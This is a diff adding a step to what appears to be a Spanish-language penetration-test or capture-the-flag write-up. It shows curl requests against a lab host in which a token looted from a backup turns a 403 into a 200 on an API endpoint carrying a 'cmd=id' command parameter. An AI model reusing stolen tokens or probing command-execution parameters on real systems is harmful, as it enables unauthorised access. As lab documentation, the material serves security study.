@@ -1,0 +1,9 @@
+# El token looteado es lo que habilita el siguiente hito (R4): /api/reporte
+# esta gateado por token. Aqui solo se demuestra que el secreto abre la puerta
+# (403 -> 200); la ejecucion del comando y su impacto se desarrollan en R4/H-04.
+
+$ curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://phantomcorp/api/reporte?cmd=id"
+HTTP 403      # sin token
+
+$ curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
+HTTP 200      # con el token del backup -> la API responde
